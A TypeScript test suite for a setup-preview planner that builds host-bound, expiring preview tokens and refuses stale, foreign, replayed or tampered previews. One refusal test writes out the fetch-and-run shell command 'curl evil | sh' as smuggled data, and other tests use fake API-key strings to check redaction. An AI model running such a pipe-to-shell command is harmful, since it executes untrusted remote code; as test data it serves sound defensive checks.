// HBS-03: deterministic previews. snapshot + profile (+ adapter/contributor actions) → SetupPlan, manual-edit
// blockers for symlinked configs, and a host-bound, 15-minute, single-use preview token; apply rediscovers,
// re-plans and compares (revalidateApply), so stale, foreign, expired, replayed and malformed previews are refused.
import { afterEach, beforeEach, describe, expect, test } from "bun:test"
import fs from "node:fs"
import {
  canonicalJSON,
  createAdapterRegistry,
  digestOf,
  planDigest,
  PREVIEW_MAX_TTL_MS,
  previewApplicable,
  validateSetupPreview,
  type Action,
  type DiscoverySnapshot,
  type HarnessAdapter,
  type PlanInput,
  type Profile,
  type SetupPreview,
} from "../src/bootstrap/contracts/index.ts"
import { discover } from "../src/bootstrap/discovery/discover.ts"
import { parsePreview, planSetup, previewSetup, renderPreview, revalidateApply, snapshotDigest, type PlanContributor } from "../src/bootstrap/preview/index.ts"
import { ACTIONS, DISCOVERY_DARWIN, DISCOVERY_INVALID, DISCOVERY_LINUX_CONTAINER, DISCOVERY_UNSUPPORTED, INSTALL_CLAUDE, MINUTE, PREVIEW_INVALID, SELECT_CLAUDE, PROFILE_FULL_HARNESS, PROFILE_LAUNCH_NODE, PROFILE_SESSION_ONLY, T0 } from "./bootstrap/fixtures.ts"
import { dir, file, LINUX_IN_CONTAINER, LINUX_MUSL, LINUX_NATIVE, link, MAC_HOME, MAC_NATIVE, MAC_SYMLINKED_CONFIG, memoryProbe, type HostSpec } from "./bootstrap/discovery-fixtures.ts"

const NONCE = "nonce-0123456789abcdef"

function snap(spec: HostSpec, now = T0): DiscoverySnapshot {
  const r = discover(memoryProbe(spec), { now })
  if (!r.ok) throw new Error(JSON.stringify(r.issues))
  return r.value
}

function preview(spec: HostSpec, profile: Profile = PROFILE_SESSION_ONLY, extra: Partial<Parameters<typeof previewSetup>[0]> = {}): SetupPreview {
  const r = previewSetup({ probe: memoryProbe(spec), profile, now: T0, nonce: NONCE, ...extra })
  if (!r.ok) throw new Error(JSON.stringify(r.issues))
  return r.value
}

const codes = (r: { ok: boolean; issues?: readonly { code: string }[] }) => (r.ok ? [] : r.issues!.map((i) => i.code))

/** What an OpenCode adapter would plan: add the hub plugin to its config, pinned to the discovered digest. */
const opencodePlugin: PlanContributor = ({ snapshot }) => {
  const config = snapshot.configs.find((c) => c.owner === "harness:opencode")
  return [{ ...(ACTIONS["merge-config"] as Action), precondition: config?.sha256 ? { exists: true, sha256: config.sha256 } : { exists: false } } as Action]
}

describe("planSetup and previewSetup", () => {
  test("a session-only preview: state dir, real verification, a bound 15-minute token", () => {
    const p = preview(MAC_NATIVE)
    expect(validateSetupPreview(p).ok).toBe(true)
    const s = snap(MAC_NATIVE)
    expect(p.plan).toMatchObject({ hostFingerprint: s.host.fingerprint, snapshotDigest: snapshotDigest(s), target: "darwin-arm64", profile: { id: "session-only", version: 2 } })
    expect(p.plan.actions.map((a) => a.id)).toEqual(["state-dir", "verify-opencode"])
    expect(p.plan.actions[1]).toMatchObject({ kind: "verify-harness", harness: "opencode", probes: ["version-exec", "provider-auth", "spoke-connected"] })
    expect(p.plan.requiresEscalation).toBe(false)
    expect(p.plan.activatesServices).toBe(false)
    expect(p.planDigest).toBe(planDigest(p.plan))
    expect(p.token).toEqual({
      schema: "hub.preview-token",
      version: 1,
      planDigest: planDigest(p.plan),
      hostFingerprint: s.host.fingerprint,
      snapshotDigest: snapshotDigest(s),
      issuedAt: T0,
      expiresAt: T0 + PREVIEW_MAX_TTL_MS,
      nonce: NONCE,
    })
    expect(p.blockers).toEqual([])
    expect(p.evidence).toEqual([])
  })

  test("deterministic: the same host and profile give the same plan and digests at any time, with any nonce", () => {
    const a = preview(MAC_NATIVE, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    const b = preview(MAC_NATIVE, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin], now: T0 + 7 * MINUTE, nonce: "another-nonce-0123456789" })
    expect(canonicalJSON(a.plan)).toBe(canonicalJSON(b.plan))
    expect(a.planDigest).toBe(b.planDigest)
    expect(a.token.snapshotDigest).toBe(b.token.snapshotDigest)
    // The snapshot digest ignores only the capture time.
    expect(snapshotDigest(snap(MAC_NATIVE, T0))).toBe(snapshotDigest(snap(MAC_NATIVE, T0 + 1)))
    expect(snapshotDigest(snap(MAC_NATIVE))).not.toBe(snapshotDigest(snap(LINUX_NATIVE)))
    expect(snapshotDigest(snap(MAC_NATIVE))).not.toBe(digestOf(snap(MAC_NATIVE)))
    // A generated nonce is valid and differs between previews.
    const n1 = previewSetup({ probe: memoryProbe(MAC_NATIVE), profile: PROFILE_SESSION_ONLY, now: T0 })
    const n2 = previewSetup({ probe: memoryProbe(MAC_NATIVE), profile: PROFILE_SESSION_ONLY, now: T0 })
    expect(n1.ok && n2.ok && n1.value.token.nonce !== n2.value.token.nonce).toBe(true)
  })

  test("actions are put in dependency order and flags are exact", () => {
    const contributor: PlanContributor = () => [ACTIONS["launch-session"], ACTIONS["activate-service"], ACTIONS["enroll-machine"], ACTIONS["install-service"], ACTIONS["write-file"]]
    const p = preview(MAC_NATIVE, PROFILE_LAUNCH_NODE, { contributors: [contributor] })
    expect(p.plan.actions.map((a) => a.id)).toEqual(["state-dir", "node-json", "node-service", "enroll", "verify-opencode", "node-activate", "first-launch"])
    expect(p.plan.activatesServices).toBe(true)
    expect(p.plan.requiresEscalation).toBe(false)
  })

  test("registered adapters plan their harnesses (in harness order); their own verification is not duplicated", () => {
    const seen: PlanInput[] = []
    const adapter = (id: "opencode" | "claude-code" | "codex", actions: Action[]): HarnessAdapter => ({
      id,
      discover: async () => ({ id, installed: false, health: { state: "unverified", probes: [] } }),
      plan: (input) => (seen.push(input), actions),
      verify: async () => ({ harness: id, probes: [] }),
    })
    const registry = createAdapterRegistry()
    registry.register(adapter("claude-code", [INSTALL_CLAUDE, SELECT_CLAUDE, { ...(ACTIONS["verify-harness"] as Action), id: "verify-claude-code", harness: "claude-code" } as Action]))
    registry.register(adapter("opencode", [ACTIONS["register-mcp-server"]]))
    const profile: Profile = { ...PROFILE_SESSION_ONLY, harnesses: ["opencode", "claude-code"] }
    const p = preview(MAC_NATIVE, profile, { adapters: registry })
    expect(seen.map((i) => i.profile.id)).toEqual(["session-only", "session-only"])
    expect(seen[0]!.snapshot.host.target).toBe("darwin-arm64")
    expect(p.plan.actions.map((a) => a.id)).toEqual(["state-dir", "install-claude", "select-claude", "opencode-mcp", "verify-opencode", "verify-claude-code"])
    // Upstream evidence for a pinned download needs the bytes: deferred to apply.
    expect(p.evidence).toEqual([
      { actionID: "install-claude", kind: "gpg-manifest", status: "deferred" },
      { actionID: "install-claude", kind: "macos-notarization", status: "deferred" },
    ])
  })

  test("opt-in runtimes are verified, never installed", () => {
    const profile: Profile = { ...PROFILE_SESSION_ONLY, runtimes: ["openshell"] }
    expect(preview(MAC_NATIVE, profile).plan.actions.map((a) => a.kind)).toEqual(["ensure-directory", "verify-harness", "verify-runtime"])
  })

  test("a config behind a symlink becomes a manual-edit blocker; its action leaves the plan", () => {
    const p = preview(MAC_SYMLINKED_CONFIG, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    expect(validateSetupPreview(p).ok).toBe(true)
    expect(p.plan.actions.map((a) => a.id)).toEqual(["state-dir", "verify-opencode"])
    expect(p.blockers).toEqual([
      {
        kind: "manual-edit",
        reason: "symlinked-config",
        actionID: "opencode-plugin",
        path: { root: "config", rel: "opencode/opencode.json" },
        linkPath: `${MAC_HOME}/.config/opencode`,
        resolvedPath: `${MAC_HOME}/dot/config/opencode/opencode.json`,
        format: "json",
        owner: "harness:opencode",
        precondition: (opencodePlugin({ snapshot: snap(MAC_SYMLINKED_CONFIG), profile: PROFILE_SESSION_ONLY })[0] as { precondition: { exists: boolean; sha256?: string } }).precondition,
        change: { op: "merge", set: [{ pointer: "/plugin/-", value: "@huynle/hub" }] },
      },
    ])
    expect(codes(previewApplicable(p))).toEqual(["manual_edit_required"])
    // The same plan on a host without the link keeps the action and has no blocker.
    const plain = preview(MAC_NATIVE, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    expect(plain.blockers).toEqual([])
    expect(plain.plan.actions.map((a) => a.id)).toContain("opencode-plugin")
    expect(previewApplicable(plain).ok).toBe(true)
  })

  test("a non-config write through a symlink is refused outright", () => {
    const spec: HostSpec = { ...MAC_NATIVE, files: { ...MAC_NATIVE.files, [`${MAC_HOME}/.local/state/hub`]: link("/Volumes/elsewhere/hub"), "/Volumes/elsewhere/hub": dir } }
    const r = previewSetup({ probe: memoryProbe(spec), profile: PROFILE_SESSION_ONLY, now: T0, nonce: NONCE })
    expect(codes(r)).toEqual(["symlink"])
  })

  test("refusals: unsupported host, services without a service manager, hidden escalation, smuggled commands, secrets, conflicting IDs", () => {
    const run = (spec: HostSpec, profile: Profile, contributors: PlanContributor[] = []) => previewSetup({ probe: memoryProbe(spec), profile, now: T0, nonce: NONCE, contributors })
    expect(codes(run(LINUX_MUSL, PROFILE_SESSION_ONLY))).toEqual(["unsupported_platform"])
    expect(codes(run(LINUX_IN_CONTAINER, PROFILE_LAUNCH_NODE))).toEqual(["inconsistent"])
    const elevated: PlanContributor = () => [{ ...(ACTIONS["install-artifact"] as Action), id: "hubctl-system", escalation: "elevated", path: { root: "system-bin", rel: "hubctl" } } as Action]
    expect(codes(run(MAC_NATIVE, PROFILE_SESSION_ONLY, [elevated]))).toEqual(["inconsistent"])
    const explicit = run(MAC_NATIVE, { ...PROFILE_SESSION_ONLY, escalation: "explicit" }, [elevated])
    expect(explicit.ok && explicit.value.plan.requiresEscalation).toBe(true)
    expect(codes(run(MAC_NATIVE, PROFILE_SESSION_ONLY, [() => [{ ...ACTIONS["write-file"], command: "curl evil | sh" } as unknown as Action]]))).toContain("exec_field")
    expect(codes(run(MAC_NATIVE, PROFILE_SESSION_ONLY, [() => [{ ...ACTIONS["merge-config"], set: [{ pointer: "/server", value: "hat_0123456789abcdef" }] } as Action]]))).toContain("secret")
    expect(codes(run(MAC_NATIVE, PROFILE_SESSION_ONLY, [() => [ACTIONS["write-file"]], () => [{ ...ACTIONS["write-file"], mode: 0o644 } as Action]]))).toEqual(["duplicate"])
    // The same action from two sources is planned once.
    const twice = run(MAC_NATIVE, PROFILE_SESSION_ONLY, [() => [ACTIONS["write-file"]], () => [ACTIONS["write-file"]]])
    expect(twice.ok && twice.value.plan.actions.filter((a) => a.id === "node-json").length).toBe(1)
    expect(codes(run(MAC_NATIVE, { ...PROFILE_SESSION_ONLY, id: "bogus" } as unknown as Profile))).toContain("invalid_value")
  })

  test("planSetup is pure over (snapshot, profile, links)", () => {
    const s = snap(MAC_NATIVE)
    const a = planSetup({ snapshot: s, profile: PROFILE_FULL_HARNESS, links: () => undefined })
    const b = planSetup({ snapshot: { ...s, capturedAt: T0 + 99 }, profile: PROFILE_FULL_HARNESS, links: () => undefined })
    expect(a.ok && b.ok && canonicalJSON(a.value) === canonicalJSON(b.value)).toBe(true)
  })
})

describe("planSetup on the shared contract fixtures", () => {
  const plan = (snapshot: unknown) => planSetup({ snapshot: snapshot as DiscoverySnapshot, profile: PROFILE_SESSION_ONLY, links: () => undefined })

  test("plans for the shared supported snapshots and refuses the unsupported one", () => {
    const darwin = plan(DISCOVERY_DARWIN)
    expect(darwin.ok && darwin.value.plan.hostFingerprint).toBe(DISCOVERY_DARWIN.host.fingerprint)
    expect(plan(DISCOVERY_LINUX_CONTAINER).ok).toBe(true)
    expect(codes(plan(DISCOVERY_UNSUPPORTED))).toEqual(["unsupported_platform"])
  })

  test("an invalid snapshot is never planned for, with the contract's issue code", () => {
    for (const [label, c] of Object.entries(DISCOVERY_INVALID)) expect({ label, reported: codes(plan(c.value)).includes(c.code) }).toEqual({ label, reported: true })
  })
})

describe("revalidateApply", () => {
  const check = (spec: HostSpec, token: unknown, over: Partial<Parameters<typeof revalidateApply>[0]> = {}) =>
    revalidateApply({ token, probe: memoryProbe(spec), profile: PROFILE_SESSION_ONLY, now: T0 + MINUTE, usedNonces: new Set(), contributors: [opencodePlugin], ...over })

  test("an unchanged host applies the previewed plan", () => {
    const p = preview(MAC_NATIVE, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    const r = check(MAC_NATIVE, p.token)
    expect(r.ok).toBe(true)
    if (r.ok) {
      expect(planDigest(r.value.plan)).toBe(p.planDigest)
      expect(r.value.token).toEqual(p.token)
    }
  })

  test("stale, foreign, expired, early, replayed and malformed previews are refused", () => {
    const p = preview(MAC_NATIVE, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    const edited: HostSpec = { ...MAC_NATIVE, files: { ...MAC_NATIVE.files, [`${MAC_HOME}/.config/opencode/opencode.json`]: file("{\"plugin\":[\"x\"]}") } }
    expect(codes(check(edited, p.token))).toEqual(["preview_stale"])
    expect(codes(check(MAC_NATIVE, p.token, { profile: PROFILE_LAUNCH_NODE }))).toEqual(["preview_stale"])
    expect(codes(check(MAC_NATIVE, { ...p.token, planDigest: digestOf("other") }))).toEqual(["preview_stale"])
    expect(codes(check(LINUX_NATIVE, p.token))).toEqual(["preview_foreign"])
    expect(codes(check({ ...MAC_NATIVE, uid: 777 }, p.token))).toEqual(["preview_foreign"])
    expect(codes(check(MAC_NATIVE, p.token, { now: T0 + 15 * MINUTE }))).toEqual(["preview_expired"])
    expect(codes(check(MAC_NATIVE, p.token, { now: T0 - 2 * MINUTE }))).toEqual(["preview_not_yet_valid"])
    expect(codes(check(MAC_NATIVE, p.token, { usedNonces: new Set([NONCE]) }))).toEqual(["preview_replayed"])
    for (const [label, c] of Object.entries(PREVIEW_INVALID)) expect([label, codes(check(MAC_NATIVE, { ...c.value as object, hostFingerprint: p.token.hostFingerprint }))]).toEqual([label, [c.code]])
    expect(codes(check(MAC_NATIVE, "not a token"))).toEqual(["invalid_value"])
    expect(codes(check(MAC_NATIVE, { ...p.token, extra: 1 }))).toEqual(["unknown_field"])
  })

  test("a host that still has a symlinked config cannot apply", () => {
    const p = preview(MAC_SYMLINKED_CONFIG, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    expect(codes(check(MAC_SYMLINKED_CONFIG, p.token))).toEqual(["manual_edit_required"])
  })

  test("parsePreview refuses malformed and tampered preview documents", () => {
    const p = preview(MAC_NATIVE, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    expect(parsePreview(JSON.parse(JSON.stringify(p)))).toEqual({ ok: true, value: p })
    expect(codes(parsePreview({ ...p, planDigest: digestOf("x") }))).toEqual(["inconsistent"])
    expect(codes(parsePreview({ ...p, plan: { ...p.plan, target: "linux-x64-musl" } }))).toContain("unsupported_platform")
    expect(codes(parsePreview({ ...p, plan: { ...p.plan, actions: [...p.plan.actions, { ...ACTIONS["ensure-directory"], id: "x", shell: "bash" }] } }))).toContain("exec_field")
    expect(codes(parsePreview({ ...p, token: { ...p.token, expiresAt: T0 + 16 * MINUTE } }))).toContain("invalid_value")
    expect(codes(parsePreview(null))).toEqual(["invalid_value"])
    expect(codes(parsePreview("{}"))).toEqual(["invalid_value"])
  })
})

describe("read-only and redacted", () => {
  const spied: { name: string; original: unknown }[] = []
  const writes: string[] = []
  beforeEach(() => {
    const target = fs as unknown as Record<string, unknown>
    for (const name of ["writeFileSync", "appendFileSync", "mkdirSync", "rmSync", "unlinkSync", "renameSync", "symlinkSync", "openSync", "writeSync", "copyFileSync", "chmodSync", "writeFile", "mkdir", "rm", "unlink", "rename", "open"]) {
      spied.push({ name, original: target[name] })
      target[name] = (...args: unknown[]) => {
        writes.push(`${name} ${String(args[0])}`)
        throw new Error(`write attempted: ${name}`)
      }
    }
    spied.push({ name: "fetch", original: globalThis.fetch })
    globalThis.fetch = (async (input: unknown) => {
      writes.push(`fetch ${String(input)}`)
      throw new Error("network attempted")
    }) as unknown as typeof fetch
  })
  afterEach(() => {
    const target = fs as unknown as Record<string, unknown>
    for (const { name, original } of spied.splice(0)) {
      if (name === "fetch") globalThis.fetch = original as typeof fetch
      else target[name] = original
    }
    writes.splice(0)
  })

  test("discover, preview and revalidation only read through the probe: no fs writes, no network", () => {
    const READS = new Set(["lstat", "stat", "readFile", "readdir", "readlink", "realpath", "executable", "machineID"])
    for (const spec of [MAC_NATIVE, MAC_SYMLINKED_CONFIG, LINUX_NATIVE, LINUX_IN_CONTAINER]) {
      const probe = memoryProbe(spec)
      const profile = PROFILE_SESSION_ONLY
      const r = previewSetup({ probe, profile, now: T0, nonce: NONCE, contributors: [opencodePlugin] })
      expect(r.ok).toBe(true)
      if (r.ok) revalidateApply({ token: r.value.token, probe, profile, now: T0 + MINUTE, usedNonces: new Set(), contributors: [opencodePlugin] })
      expect(probe.calls.filter((c) => !READS.has(c.method))).toEqual([])
    }
    expect(writes).toEqual([])
  })

  test("previews never carry environment secrets, and the rendering is home-relative and secret-free", () => {
    const spec: HostSpec = { ...MAC_SYMLINKED_CONFIG, env: { ...MAC_SYMLINKED_CONFIG.env, ANTHROPIC_API_KEY: "sk-ant-0123456789abcdef" } }
    const p = preview(spec, PROFILE_SESSION_ONLY, { contributors: [opencodePlugin] })
    expect(canonicalJSON(p)).not.toContain("sk-ant")
    const lines = renderPreview(p, MAC_HOME)
    const text = lines.join("\n")
    expect(text).toContain("~/dot/config/opencode/opencode.json")
    expect(text).toContain("/plugin/-")
    expect(text).not.toContain(MAC_HOME)
    expect(text).not.toContain(NONCE)
    expect(text).not.toContain("sk-ant")
    expect(lines.some((l) => l.includes("Verify OpenCode"))).toBe(true)
  })
})
